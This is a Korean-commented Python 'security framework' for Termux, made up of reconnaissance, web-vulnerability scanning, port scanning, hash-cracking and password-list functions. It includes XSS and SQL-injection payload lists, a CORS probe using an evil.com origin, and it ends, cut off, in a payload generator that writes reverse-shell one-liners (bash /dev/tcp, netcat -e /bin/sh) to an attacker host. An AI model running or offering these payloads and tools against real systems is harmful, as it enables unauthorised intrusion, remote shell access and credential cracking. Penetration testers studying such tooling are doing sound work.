"""
Termux OSINT & Advanced Security Framework v3.0
다양한 프로그래밍 언어를 지원하는 대규모 페이로드 라이브러리와 고도화된 보안 분석 기능을 갖춘 통합 프레임워크입니다.

[신규 추가 언어 및 기능]
- Shell, Python, JavaScript, C, Java, Go, Ruby, Perl, C#, PHP 등 10종 이상의 언어 지원
- 언어별 Reverse/Bind Shell, One-liners, Code Injection 페이로드
- 웹 취약점(XSS, SQLi, LFI/RFI, SSTI) 언어별 우회 페이로드
- 해킹 유틸리티 및 암호학 모듈 강화
"""

import os
import socket
import requests
import json
import subprocess
import sys
import time
import re
import hashlib
import base64
import urllib.parse
import ssl
import random
import itertools
from datetime import datetime
from bs4 import BeautifulSoup

# ANSI 색상 코드 정의
class Colors:
    RESET = '\033[0m'
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def clear_screen():
    os.system("clear" if os.name == "posix" else "cls")

def print_banner():
    clear_screen()
    # Raw string 대신 일반 문자열에 백슬래시를 이중으로 처리하여 f-string 유지
    banner = f"""
{Colors.CYAN}{Colors.BOLD}
   ___ ____  ____  _   _ _____ _____ _   _ 
  / _ \___ \|  _ \| | | | ____|_   _| \ | |
 | | | |__) | |_) | | | |  _|   | | |  \| |
 | |_| / __/|  _ <| |_| | |___  | | | |\  |
  \\\\\\\\___/_____|_| \\\\_\\\\\\\\___/|_____| |_| |_| \\\\_|

{Colors.YELLOW}    - Advanced Multi-Language Security Framework v3.0 -{Colors.RESET}
"""
    print(banner)
    print(f"{Colors.MAGENTA}{Colors.BOLD}====================================================={Colors.RESET}")
    print(f"{Colors.WHITE}  멀티 언어 페이로드 라이브러리 및 고도화된 보안 분석 도구{Colors.RESET}")
    print(f"{Colors.MAGENTA}{Colors.BOLD}====================================================={Colors.RESET}\n")

# --- 유틸리티 함수 ---
def is_ip_address(target):
    try:
        socket.inet_aton(target)
        return True
    except:
        return False

def print_result(title, result, color=Colors.BLUE):
    print(f"{color}\n[+] {title}:{Colors.RESET}")
    if isinstance(result, dict):
        for key, value in result.items():
            if isinstance(value, (dict, list)):
                print(f"  {key}:")
                if isinstance(value, dict):
                    for k, v in value.items():
                        print(f"    - {k}: {v}")
                else:
                    for item in value:
                        print(f"    - {item}")
            else:
                print(f"  {key}: {value}")
    elif isinstance(result, list):
        for item in result:
            print(f"  - {item}")
    else:
        print(f"  {result}")

# --- 1. 정보 수집 및 네트워크 분석 (기존 기능 유지 및 강화) ---

def get_whois_info(target):
    try:
        result = subprocess.run(["whois", target], capture_output=True, text=True, check=True, timeout=10)
        return result.stdout
    except (subprocess.CalledProcessError, FileNotFoundError, subprocess.TimeoutExpired) as e:
        return f"WHOIS 정보 조회 실패: {e}\n(Tip: Termux에서는 'pkg install whois'가 필요할 수 있습니다.)"
    except Exception as e:
        return f"WHOIS 정보 조회 실패: {e}"

def get_dns_info(target):
    try:
        if is_ip_address(target):
            return {"IP Address": target}
        ip_address = socket.gethostbyname(target)
        return {"Domain": target, "IP Address": ip_address}
    except socket.gaierror:
        return f"DNS 정보 조회 실패: {target}에 대한 IP 주소를 찾을 수 없습니다."
    except Exception as e:
        return f"DNS 정보 조회 실패: {e}"

def get_ip_geolocation(ip_address):
    try:
        response = requests.get(f"http://ip-api.com/json/{ip_address}", timeout=5)
        response.raise_for_status()
        data = response.json()
        if data and data.get("status") == "success":
            return {
                "IP": data.get("query"),
                "Country": data.get("country"),
                "City": data.get("city"),
                "Region": data.get("regionName"),
                "ISP": data.get("isp"),
                "Org": data.get("org"),
                "Lat": data.get("lat"),
                "Lon": data.get("lon")
            }
        else:
            return f"IP 위치 정보 조회 실패: {data.get('message', '알 수 없는 오류')}"
    except Exception as e:
        return f"IP 위치 정보 조회 실패: {e}"

def subdomain_finder(domain):
    common = ["www", "blog", "mail", "ftp", "dev", "admin", "api", "test", "webmail", "cpanel", "ns1", "ns2", "shop", "secure", "vpn", "m"]
    found = []
    for sub in common:
        try:
            target = f"{sub}.{domain}"
            ip = socket.gethostbyname(target)
            found.append(f"{target} ({ip})")
        except:
            pass
    return {"Found Subdomains": found} if found else "서브도메인 없음"

def email_harvester(url):
    emails = set()
    try:
        if not url.startswith("http"):
            url = "http://" + url
        response = requests.get(url, timeout=10, headers={"User-Agent": "Mozilla/5.0"})
        response.raise_for_status()
        soup = BeautifulSoup(response.text, "html.parser")
        email_pattern = r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}"
        emails.update(re.findall(email_pattern, soup.get_text()))
        return {"Emails Found": list(emails)} if emails else "이메일 주소를 찾을 수 없습니다."
    except Exception as e:
        return f"이메일 수집 실패: {e}"

def get_ssl_info(host):
    try:
        ctx = ssl.create_default_context()
        with ctx.wrap_socket(socket.socket(), server_hostname=host) as s:
            s.settimeout(5)
            s.connect((host, 443))
            cert = s.getpeercert()
            
            subject = dict(x[0] for x in cert.get('subject', []))
            issuer = dict(x[0] for x in cert.get('issuer', []))
            return {
                "Subject": subject.get('commonName', 'Unknown'),
                "Issuer": issuer.get('commonName', 'Unknown'),
                "Valid From": cert.get('notBefore', 'Unknown'),
                "Valid To": cert.get('notAfter', 'Unknown'),
                "Serial Number": cert.get('serialNumber', 'Unknown')
            }
    except Exception as e:
        return f"SSL 인증서 정보 조회 실패: {e}"

def reverse_ip_lookup(ip_address):
    try:
        hostname = socket.gethostbyaddr(ip_address)[0]
        return {"Hostname": hostname}
    except socket.herror:
        return get_shared_hosting(ip_address)
    except Exception as e:
        return f"역방향 IP 조회 실패: {e}"

def get_shared_hosting(ip_address):
    """대상 IP에 여러 도메인이 호스팅되는지 확인 (공유 호스팅 감지 기능)"""
    try:
        url = f"https://api.hackertarget.com/reverseiplookup/?q={ip_address}"
        response = requests.get(url, timeout=10)
        if response.status_code == 200 and "No records found" not in response.text:
            domains = response.text.strip().split("\n")
            return {"Shared Hosting Detected": "Yes", "Associated Domains": domains}
        else:
            return {"Shared Hosting Detected": "No or Unknown", "Message": "연관 도메인을 찾을 수 없습니다."}
    except Exception as e:
        return {"Error": f"공유 호스팅 감지 실패: {e}"}

def google_dork_generator(domain):
    dorks = [
        f"site:{domain} intitle:\"index of\"",
        f"site:{domain} inurl:admin",
        f"site:{domain} inurl:login",
        f"site:{domain} filetype:pdf confidential",
        f"site:{domain} intext:\"password\"",
        f"site:{domain} ext:log | ext:txt | ext:sql",
        f"site:{domain} inurl:wp-content | inurl:wp-includes"
    ]
    return {"Google Dorks": dorks}

# --- 2. Web Analysis & Advanced Vulnerability Scanning (웹 분석 및 취약점 스캔 고도화) ---

def web_tech_detector(target_url):
    tech_info = {}
    try:
        if not target_url.startswith("http"):
            target_url = "http://" + target_url
        response = requests.get(target_url, timeout=10, headers={"User-Agent": "Mozilla/5.0"})
        response.raise_for_status()
        soup = BeautifulSoup(response.text, "html.parser")
        
        headers = response.headers
        if "Server" in headers:
            tech_info["Server"] = headers["Server"]
        if "X-Powered-By" in headers:
            tech_info["X-Powered-By"] = headers["X-Powered-By"]
        
        for meta in soup.find_all("meta"):
            if meta.get("name") == "generator":
                tech_info["Generator"] = meta.get("content")
            
        scripts = soup.find_all("script", src=True)
        for script in scripts:
            src = script["src"].lower()
            if "jquery" in src:
                tech_info["JS Library"] = "jQuery"
            elif "react" in src:
                tech_info["JS Framework"] = "React"
            elif "vue" in src:
                tech_info["JS Framework"] = "Vue.js"
            elif "angular" in src:
                tech_info["JS Framework"] = "Angular"
            
        if soup.find(lambda tag: "wp-content" in str(tag) or "wp-json" in str(tag)):
            tech_info["CMS"] = "WordPress"
        elif soup.find(lambda tag: "joomla" in str(tag)):
            tech_info["CMS"] = "Joomla"
        elif soup.find(lambda tag: "drupal" in str(tag)):
            tech_info["CMS"] = "Drupal"
        
        return tech_info if tech_info else "웹 기술 정보를 찾을 수 없습니다."
    except Exception as e:
        return f"웹 기술 분석 실패: {e}"

def waf_detector(url):
    try:
        if not url.startswith("http"):
            url = "http://" + url
        response = requests.get(url, timeout=5, headers={"User-Agent": "Mozilla/5.0"})
        waf_signatures = {
            "Cloudflare": ["cloudflare-nginx", "__cfduid", "cloudflare"],
            "Incapsula": ["incapsula", "X-CDN", "visid_incap"],
            "Sucuri": ["sucuri/cloudproxy", "x-sucuri-id"],
            "Akamai": ["akamai", "akamai-ghs"],
            "ModSecurity": ["mod_security", "Mod_Security_Status", "NO_CACHE"],
            "AWS WAF": ["aws-waf", "awselb"]
        }
        detected_wafs = []
        for waf, signatures in waf_signatures.items():
            for sig in signatures:
                if sig.lower() in str(response.headers).lower() or sig.lower() in response.text.lower():
                    detected_wafs.append(waf)
                    break
        return {"Detected WAFs": detected_wafs} if detected_wafs else "WAF를 찾을 수 없습니다."
    except Exception as e:
        return f"WAF 감지 실패: {e}"

def security_headers_check(url):
    headers_info = {}
    try:
        if not url.startswith("http"):
            url = "http://" + url
        response = requests.get(url, timeout=5, headers={"User-Agent": "Mozilla/5.0"})
        headers = response.headers
        security_headers = [
            "Strict-Transport-Security", "X-Frame-Options", "X-XSS-Protection",
            "Content-Security-Policy", "X-Content-Type-Options", "Referrer-Policy"
        ]
        for header in security_headers:
            headers_info[header] = headers.get(header, "Not Set (취약할 수 있음)")
        return headers_info
    except Exception as e:
        return f"보안 헤더 분석 실패: {e}"

def clickjacking_test(url):
    try:
        if not url.startswith("http"):
            url = "http://" + url
        response = requests.get(url, timeout=5, headers={"User-Agent": "Mozilla/5.0"})
        x_frame_options = response.headers.get("X-Frame-Options", "Not Set").lower()
        csp = response.headers.get("Content-Security-Policy", "Not Set").lower()
        
        if "deny" in x_frame_options or "sameorigin" in x_frame_options or "frame-ancestors" in csp:
            return "Clickjacking 방어: X-Frame-Options 또는 CSP 설정됨."
        else:
            return "Clickjacking 취약 가능: 보호 헤더가 설정되지 않았습니다!"
    except Exception as e:
        return f"Clickjacking 테스트 실패: {e}"

def open_redirect_check(url, test_payload="//google.com"):
    try:
        if not url.startswith("http"):
            url = "http://" + url
        test_url = f"{url}?redirect={test_payload}"
        response = requests.get(test_url, allow_redirects=False, timeout=5, headers={"User-Agent": "Mozilla/5.0"})
        if response.status_code in [301, 302] and test_payload in response.headers.get("Location", ""):
            return f"Open Redirect 취약 가능: {response.headers.get('Location')}로 리다이렉트됨!"
        else:
            return "Open Redirect 취약점 없음 (또는 감지 실패)."
    except Exception as e:
        return f"Open Redirect 테스트 실패: {e}"

def cors_misconfiguration_check(url):
    try:
        if not url.startswith("http"):
            url = "http://" + url
        headers = {"Origin": "http://evil.com", "User-Agent": "Mozilla/5.0"}
        response = requests.get(url, headers=headers, timeout=5)
        acao = response.headers.get("Access-Control-Allow-Origin")
        acac = response.headers.get("Access-Control-Allow-Credentials")
        
        if acao == "*" or "http://evil.com" in str(acao):
            result = f"CORS 취약 가능: Access-Control-Allow-Origin: {acao}"
            if acac == "true":
                result += " (Credentials 허용됨 - 위험도 높음!)"
            return result
        else:
            return "CORS 취약점 없음 (또는 감지 실패)."
    except Exception as e:
        return f"CORS 분석 실패: {e}"

def robots_txt_analyzer(url):
    try:
        if not url.startswith("http"):
            url = "http://" + url
        robots_url = urllib.parse.urljoin(url, "/robots.txt")
        response = requests.get(robots_url, timeout=5, headers={"User-Agent": "Mozilla/5.0"})
        if response.status_code == 200:
            disallowed = re.findall(r"Disallow:\s*(.*)", response.text, re.IGNORECASE)
            return {"Disallowed Paths": disallowed} if disallowed else "robots.txt에 Disallow 규칙 없음."
        else:
            return "robots.txt 파일을 찾을 수 없습니다."
    except Exception as e:
        return f"robots.txt 분석 실패: {e}"

def sitemap_xml_finder(url):
    try:
        if not url.startswith("http"):
            url = "http://" + url
        sitemap_url = urllib.parse.urljoin(url, "/sitemap.xml")
        response = requests.get(sitemap_url, timeout=5, headers={"User-Agent": "Mozilla/5.0"})
        if response.status_code == 200:
            return {"Sitemap URL": sitemap_url}
        else:
            return "sitemap.xml 파일을 찾을 수 없습니다."
    except Exception as e:
        return f"sitemap.xml 찾기 실패: {e}"

# --- 고도화된 취약점 스캐너 기능 ---

def xss_sqli_scanner(url):
    """XSS 및 SQLi 취약점 모의 테스트 및 스캐닝"""
    if not url.startswith("http"):
        url = "http://" + url
    
    results = {"SQL Injection": "안전함 (또는 탐지되지 않음)", "XSS (Cross-Site Scripting)": "안전함 (또는 탐지되지 않음)"}
    
    sqli_payloads = ["'", "1' OR '1'='1", "' OR 1=1 --", "' UNION SELECT NULL, NULL --", '" OR 1=1 --']
    xss_payloads = ["<script>alert(1)</script>", "><script>alert(1)</script>", "<img src=x onerror=alert(1)>", "javascript:alert(1)"]
    
    parsed_url = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qs(parsed_url.query)
    
    if not params:
        url_with_param = url + "?id=1"
        parsed_url = urllib.parse.urlparse(url_with_param)
        params = urllib.parse.parse_qs(parsed_url.query)
        base_url = url_with_param.split('?')[0]
    else:
        base_url = url.split('?')[0]
        
    print(f"{Colors.YELLOW}[*] 테스트 대상 파라미터 기반 분석 시작...{Colors.RESET}")
    
    sqli_vuln = False
    for param in params:
        for payload in sqli_payloads:
            test_params = params.copy()
            test_params[param] = [payload]
            try:
                test_url = base_url + "?" + urllib.parse.urlencode(test_params, doseq=True)
                response = requests.get(test_url, timeout=5, headers={"User-Agent": "Mozilla/5.0"})
                sql_errors = [
                    "you have an error in your sql syntax",
                    "warning: mysql_fetch_assoc",
                    "unclosed quotation mark after the character string",
                    "postgresql query failed",
                    "oracle error",
                    "driver] [microsoft] [odbc sql server driver]"
                ]
                for error in sql_errors:
                    if error in response.text.lower():
                        sqli_vuln = True
                        results["SQL Injection"] = f"취약 가능성 감지! 파라미터: '{param}' | 페이로드: '{payload}' | 에러 감지: '{error}'"
                        break
                if sqli_vuln:
                    break
            except Exception:
                pass
        if sqli_vuln:
            break
            
    xss_vuln = False
    for param in params:
        for payload in xss_payloads:
            test_params = params.copy()
            test_params[param] = [payload]
            try:
                test_url = base_url + "?" + urllib.parse.urlencode(test_params, doseq=True)
                response = requests.get(test_url, timeout=5, headers={"User-Agent": "Mozilla/5.0"})
                if payload in response.text:
                    xss_vuln = True
                    results["XSS (Cross-Site Scripting)"] = f"취약 가능성 감지! 파라미터: '{param}' | 페이로드: '{payload}' (Reflected)"
                    break
            except Exception:
                pass
        if xss_vuln:
            break
            
    return results

def dir_bruteforcer(url, custom_wordlist_path=None):
    """디렉토리 브루트포싱 기능 고도화 (기본 워드리스트 확장 및 사용자 정의 워드리스트 지원)"""
    if not url.startswith("http"):
        url = "http://" + url
    
    default_wordlist = [
        "admin", "login", "wp-admin", "robots.txt", "sitemap.xml", "config", "db", "backup", 
        "uploads", "images", "assets", "js", "css", "test", "dev", "api", "v1", "v2", "secret", 
        "password", "keys", "git", "sql", "database", "backup.zip", "config.php", "index.php", 
        "info.php", "phpinfo.php", "cpanel", "shell.php", "panel", "dashboard", "administrator",
        "temp", "old", "new", "private", "src", "vendor", "composer.json", "package.json"
    ]
    
    wordlist = default_wordlist
    if custom_wordlist_path:
        if os.path.exists(custom_wordlist_path):
            try:
                with open(custom_wordlist_path, "r", encoding="utf-8") as f:
                    wordlist = [line.strip() for line in f if line.strip()]
                print(f"{Colors.GREEN}[+] 사용자 정의 워드리스트 로드 완료 ({len(wordlist)}개 항목){Colors.RESET}")
            except Exception as e:
                print(f"{Colors.RED}[-] 워드리스트 파일 읽기 실패: {e}. 기본 워드리스트를 사용합니다.{Colors.RESET}")
        else:
            print(f"{Colors.RED}[-] 파일이 존재하지 않습니다: {custom_wordlist_path}. 기본 워드리스트를 사용합니다.{Colors.RESET}")
            
    found_dirs = []
    print(f"{Colors.YELLOW}[*] 브루트포싱 시작 (총 {len(wordlist)}개 테스트)...{Colors.RESET}")
    
    for word in wordlist:
        target_url = urllib.parse.urljoin(url, f"/{word}")
        try:
            response = requests.head(target_url, allow_redirects=False, timeout=3, headers={"User-Agent": "Mozilla/5.0"})
            status = response.status_code
            if status in [200, 301, 302, 403]:
                status_desc = {200: "OK", 301: "Moved Permanently", 302: "Found", 403: "Forbidden"}.get(status, "")
                found_dirs.append(f"{target_url} (Status: {status} {status_desc})")
                print(f"  {Colors.GREEN}[Found] {target_url} ({status}){Colors.RESET}")
        except Exception:
            pass
            
    return {"Discovered Paths": found_dirs} if found_dirs else "발견된 디렉토리가 없습니다."

def cms_scanner(url):
    """WordPress, Joomla 등 특정 CMS의 버전 정보를 파악하고 알려진 취약점 검색"""
    if not url.startswith("http"):
        url = "http://" + url
        
    cms_info = {"CMS Detected": "None", "Version": "Unknown", "Known Vulnerabilities": []}
    
    try:
        response = requests.get(url, timeout=5, headers={"User-Agent": "Mozilla/5.0"})
        soup = BeautifulSoup(response.text, "html.parser")
        
        wp_meta = soup.find("meta", {"name": "generator"})
        if wp_meta and "wordpress" in wp_meta.get("content", "").lower():
            cms_info["CMS Detected"] = "WordPress"
            version_match = re.search(r"WordPress\s*([\d.]+)", wp_meta.get("content", ""), re.IGNORECASE)
            if version_match:
                cms_info["Version"] = version_match.group(1)
        else:
            test_wp = requests.get(urllib.parse.urljoin(url, "/readme.html"), timeout=3)
            if test_wp.status_code == 200 and "wordpress" in test_wp.text.lower():
                cms_info["CMS Detected"] = "WordPress"
                v_match = re.search(r"Version\s*([\d.]+)", test_wp.text, re.IGNORECASE)
                if v_match:
                    cms_info["Version"] = v_match.group(1)
                    
        if cms_info["CMS Detected"] == "None":
            joomla_meta = soup.find("meta", {"name": "generator"})
            if joomla_meta and "joomla" in joomla_meta.get("content", "").lower():
                cms_info["CMS Detected"] = "Joomla"
                version_match = re.search(r"Joomla!\s*([\d.]+)", joomla_meta.get("content", ""), re.IGNORECASE)
                if version_match:
                    cms_info["Version"] = version_match.group(1)
                    
        vuln_db = {
            "WordPress": {
                "5.0": ["CVE-2019-8942: WordPress Crop-to-Fit 이미지 원격 코드 실행(RCE)", "CVE-2019-8943: WordPress 경로 트래버스 취약점"],
                "4.7": ["CVE-2017-8295: WordPress 호스트 헤더 주입 취약점", "CVE-2017-5487: WordPress REST API 사용자 정보 노출"],
                "5.4": ["CVE-2020-11027: WordPress 패스워드 리셋 토큰 노출 취약점"]
            },
            "Joomla": {
                "3.9": ["CVE-2019-15028: Joomla SQL Injection 취약점"],
                "3.4": ["CVE-2015-8562: Joomla Object Injection 원격 코드 실행(RCE)"]
            }
        }
        
        cms_name = cms_info["CMS Detected"]
        version = cms_info["Version"]
        
        if cms_name in vuln_db:
            matched_vulns = []
            for v_key, vulns in vuln_db[cms_name].items():
                if version.startswith(v_key):
                    matched_vulns.extend(vulns)
            cms_info["Known Vulnerabilities"] = matched_vulns if matched_vulns else ["해당 버전에 매핑된 알려진 취약점이 로컬 DB에 없습니다."]
            
    except Exception as e:
        return f"CMS 스캔 실패: {e}"
        
    return cms_info

def exploit_db_search(keyword):
    """Exploit-DB 데이터베이스 기반 취약점 검색 기능 (Local Dataset 기반 시뮬레이션)"""
    exploit_database = [
        {"id": "46353", "title": "WordPress Core 5.0.0 - RCE (Crop-to-Fit)", "platform": "PHP", "cve": "CVE-2019-8942"},
        {"id": "41962", "title": "WordPress Core 4.7.1 - Username Enumeration", "platform": "Multiple", "cve": "CVE-2017-5487"},
        {"id": "39033", "title": "Joomla! 3.4.4 - 'User-Agent' Object Injection (RCE)", "platform": "PHP", "cve": "CVE-2015-8562"},
        {"id": "47691", "title": "Apache 2.4.41 - Local Privilege Escalation", "platform": "Linux", "cve": "CVE-2019-12515"},
        {"id": "50000", "title": "OpenSSH 8.4p1 - Double Free Connection Close", "platform": "Linux", "cve": "CVE-2021-28041"},
        {"id": "48537", "title": "phpMyAdmin 4.8.1 - Local File Inclusion (LFI)", "platform": "PHP", "cve": "CVE-2018-12613"},
        {"id": "42324", "title": "Webmin 1.850 - 'password_change.cgi' Backdoor (RCE)", "platform": "CGI", "cve": "CVE-2019-15107"},
        {"id": "45210", "title": "MySQL 5.7 - Windows Local Privilege Escalation", "platform": "Windows", "cve": "CVE-2018-3282"}
    ]
    
    results = []
    for exp in exploit_database:
        if keyword.lower() in exp["title"].lower() or keyword.lower() in exp["cve"].lower():
            results.append(exp)
            
    if results:
        return {"Search Keyword": keyword, "Results Found": len(results), "Exploits": results}
    else:
        return f"'{keyword}'에 대한 Exploit-DB 매칭 결과를 찾을 수 없습니다. (실제 상세 검색은 exploit-db.com을 참고하세요.)"

# --- 3. Network & System Analysis Functions (네트워크 및 시스템 분석 기능 확장) ---

def port_scanner(target_host, ports):
    """포트 스캔 및 열린 포트 반환"""
    open_ports = []
    for port in ports:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.5)
        if sock.connect_ex((target_host, port)) == 0:
            open_ports.append(port)
        sock.close()
    return {"Open Ports": open_ports} if open_ports else "열린 포트 없음"

def service_version_detection(target_host, ports):
    """포트 스캔 후 열린 포트에서 실행 중인 서비스의 정확한 버전을 파악 (배너 그래빙 고도화)"""
    banners = {}
    for port in ports:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2.0)
            sock.connect((target_host, port))
            
            if port == 80 or port == 8080:
                sock.sendall(b"GET / HTTP/1.1\r\nHost: test\r\n\r\n")
            elif port == 443:
                sock.sendall(b"\r\n\r\n")
                
            banner = sock.recv(1024).decode("utf-8", errors="ignore").strip()
            sock.close()
            
            if banner:
                if "Server:" in banner:
                    server_header = re.search(r"Server:\s*(.*)", banner, re.IGNORECASE)
                    if server_header:
                        banners[port] = server_header.group(1).split("\r")[0]
                    else:
                        banners[port] = banner.split("\n")[0]
                else:
                    banners[port] = banner.split("\n")[0]
            else:
                banners[port] = "배너 응답 없음 (연결 성공)"
        except Exception as e:
            banners[port] = f"Error: {e}"
    return banners if banners else "서비스 버전을 감지할 수 없습니다."

def ftp_anonymous_login_check(target_host):
    try:
        from ftplib import FTP
        ftp = FTP(target_host, timeout=5)
        ftp.login("anonymous", "anonymous")
        ftp.quit()
        return "FTP 익명 로그인 가능! (보안 취약)"
    except Exception as e:
        return f"FTP 익명 로그인 불가 또는 오류: {e}"

def traceroute(target):
    try:
        result = subprocess.run(["traceroute", target], capture_output=True, text=True, timeout=30)
        return result.stdout
    except (subprocess.CalledProcessError, FileNotFoundError, subprocess.TimeoutExpired) as e:
        return f"Traceroute 실패: {e}\n(Tip: Termux에서는 'pkg install traceroute'가 필요할 수 있습니다.)"
    except Exception as e:
        return f"Traceroute 실패: {e}"

def ping_sweep(ip_range_start, ip_range_end):
    live_hosts = []
    try:
        start_octets = ip_range_start.split(".")
        end_last = int(ip_range_end.split(".")[-1])
        base_ip = ".".join(start_octets[:-1])
        start_last = int(start_octets[-1])
    except ValueError:
        return "IP 주소 형식이 올바르지 않습니다."

    print(f"{Colors.YELLOW}[*] {base_ip}.{start_last} ~ {base_ip}.{end_last} 범위 스캔 중...{Colors.RESET}")
    for i in range(start_last, end_last + 1):
        ip = f"{base_ip}.{i}"
        try:
            result = subprocess.run(["ping", "-c", "1", "-W", "1", ip], capture_output=True, text=True, timeout=2)
            if "1 received" in result.stdout or "1 packets received" in result.stdout:
                live_hosts.append(ip)
                print(f"  {Colors.GREEN}[+] Live Host: {ip}{Colors.RESET}")
        except Exception:
            pass
    return {"Live Hosts": live_hosts} if live_hosts else "활성 호스트 없음"

def network_latency_check(target):
    try:
        result = subprocess.run(["ping", "-c", "4", target], capture_output=True, text=True, timeout=10)
        match = re.search(r"rtt min/avg/max/mdev = ([\d.]+)/([\d.]+)/([\d.]+)/[\d.]+ ms", result.stdout)
        if match:
            return {"Min Latency": f"{match.group(1)} ms", "Avg Latency": f"{match.group(2)} ms", "Max Latency": f"{match.group(3)} ms"}
        else:
            alt_match = re.search(r"round-trip min/avg/max = ([\d.]+)/([\d.]+)/([\d.]+)", result.stdout)
            if alt_match:
                return {"Min Latency": f"{alt_match.group(1)} ms", "Avg Latency": f"{alt_match.group(2)} ms", "Max Latency": f"{alt_match.group(3)} ms"}
            return "지연 시간 측정 완료 (상세 분석 실패). 출력 결과:\n" + result.stdout
    except Exception as e:
        return f"지연 시간 측정 실패: {e}"

# --- 4. Cryptography & Utilities Functions (암호학 및 유틸리티 기능 강화) ---

def hash_generator(text):
    return {
        "MD5": hashlib.md5(text.encode()).hexdigest(),
        "SHA1": hashlib.sha1(text.encode()).hexdigest(),
        "SHA256": hashlib.sha256(text.encode()).hexdigest()
    }

def hash_identifier(hash_value):
    hash_value = hash_value.strip()
    if re.match(r"^[a-f0-9]{32}$", hash_value, re.IGNORECASE):
        return "MD5"
    elif re.match(r"^[a-f0-9]{40}$", hash_value, re.IGNORECASE):
        return "SHA1"
    elif re.match(r"^[a-f0-9]{64}$", hash_value, re.IGNORECASE):
        return "SHA256"
    elif re.match(r"^[a-f0-9]{128}$", hash_value, re.IGNORECASE):
        return "SHA512"
    else:
        return "알 수 없는 해시 유형"

def base64_encode_decode(text, mode="encode"):
    if mode == "encode":
        return base64.b64encode(text.encode()).decode()
    elif mode == "decode":
        try:
            return base64.b64decode(text.encode()).decode()
        except:
            return "디코딩 실패 (올바른 Base64 포맷이 아닙니다)"
    return "잘못된 모드"

def url_encode_decode(text, mode="encode"):
    if mode == "encode":
        return urllib.parse.quote(text)
    elif mode == "decode":
        return urllib.parse.unquote(text)
    return "잘못된 모드"

def password_generator(length=12, include_symbols=True):
    import string
    chars = string.ascii_letters + string.digits
    if include_symbols:
        chars += string.punctuation
    return "".join(random.choice(chars) for _ in range(length))

def ip_calculator(ip_cidr):
    try:
        import ipaddress
        network = ipaddress.ip_network(ip_cidr, strict=False)
        return {
            "Network Address": str(network.network_address),
            "Broadcast Address": str(network.broadcast_address),
            "Netmask": str(network.netmask),
            "Hostmask": str(network.hostmask),
            "Number of Hosts": network.num_addresses - 2 if network.num_addresses > 2 else network.num_addresses,
            "Host Range": f"{network.network_address + 1} - {network.broadcast_address - 1}"
        }
    except Exception as e:
        return f"IP 계산 실패: {e}"

def epoch_converter(timestamp, mode="to_date"):
    try:
        if mode == "to_date":
            return datetime.fromtimestamp(int(timestamp)).strftime("%Y-%m-%d %H:%M:%S")
        elif mode == "to_epoch":
            return int(datetime.strptime(timestamp, "%Y-%m-%d %H:%M:%S").timestamp())
    except Exception as e:
        return f"Epoch 변환 실패: {e}"

def hash_cracker(target_hash, custom_wordlist_path=None):
    """간단한 워드리스트 기반의 해시 크래킹 기능"""
    default_passwords = [
        "123456", "password", "123456789", "12345", "1234567", "qwerty", "admin", 
        "letmein1", "welcome", "1234567890", "111111", "iloveyou", "password123", "pass123",
        "superman", "secret", "groot", "root", "oracle", "system", "cisco", "agent007", "ninja"
    ]
    
    hash_type = hash_identifier(target_hash)
    if hash_type == "알 수 없는 해시 유형":
        return "지원하지 않거나 올바르지 않은 해시 포맷입니다."
        
    wordlist = default_passwords
    if custom_wordlist_path:
        if os.path.exists(custom_wordlist_path):
            try:
                with open(custom_wordlist_path, "r", encoding="utf-8") as f:
                    wordlist = [line.strip() for line in f if line.strip()]
            except Exception as e:
                print(f"{Colors.RED}[-] 워드리스트 읽기 실패: {e}. 기본 목록을 사용합니다.{Colors.RESET}")
        else:
            print(f"{Colors.RED}[-] 워드리스트 파일이 없습니다: {custom_wordlist_path}. 기본 목록을 사용합니다.{Colors.RESET}")
            
    print(f"{Colors.YELLOW}[*] {hash_type} 해시 크래킹 시작...{Colors.RESET}")
    for pwd in wordlist:
        if hash_type == "MD5":
            hashed = hashlib.md5(pwd.encode()).hexdigest()
        elif hash_type == "SHA1":
            hashed = hashlib.sha1(pwd.encode()).hexdigest()
        elif hash_type == "SHA256":
            hashed = hashlib.sha256(pwd.encode()).hexdigest()
        elif hash_type == "SHA512":
            hashed = hashlib.sha512(pwd.encode()).hexdigest()
        else:
            continue
            
        if hashed.lower() == target_hash.strip().lower():
            return {"Cracked": "SUCCESS", "Plaintext": pwd, "Hash Type": hash_type}
            
    return {"Cracked": "FAILED", "Message": "워드리스트 내에서 매칭되는 패스워드를 찾지 못했습니다."}

def password_list_generator(keywords, use_digits=True, use_specials=True, output_file="wordlist.txt"):
    """특정 규칙 기반의 패스워드 조합 리스트 생성기"""
    digits = ["123", "1", "2026", "1234", "01"] if use_digits else []
    specials = ["!", "@", "#", "$", "?", "*"] if use_specials else []
    
    wordlist = set()
    
    for kw in keywords:
        wordlist.add(kw)
        wordlist.add(kw.capitalize())
        wordlist.add(kw.upper())
        
    for kw in keywords:
        for d in digits:
            wordlist.add(f"{kw}{d}")
            wordlist.add(f"{kw.capitalize()}{d}")
            
        for s in specials:
            wordlist.add(f"{kw}{s}")
            wordlist.add(f"{kw.capitalize()}{s}")
            
        for d in digits:
            for s in specials:
                wordlist.add(f"{kw}{d}{s}")
                wordlist.add(f"{kw.capitalize()}{d}{s}")
                wordlist.add(f"{kw}{s}{d}")
                
    try:
        with open(output_file, "w", encoding="utf-8") as f:
            for word in sorted(wordlist):
                f.write(word + "\n")
        return {"Status": "SUCCESS", "File Saved": output_file, "Total Count": len(wordlist)}
    except Exception as e:
        return {"Status": "FAILED", "Error": str(e)}

# --- 5. 공격 모듈 및 페이로드 생성기 (Payload Generator) ---

class PayloadLibrary:
    @staticmethod
    def get_shell_payloads(lhost, lport):
        return {
            "Bash TCP": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            "Bash UDP": f"sh -i >& /dev/udp/{lhost}/{lport} 0>&1",
            "Netcat OpenBSD": f"nc -e /bin/sh {lhost} {lport}",
            "Netcat BusyBox": f"nc {lhost} {lport} -e /bin/sh",
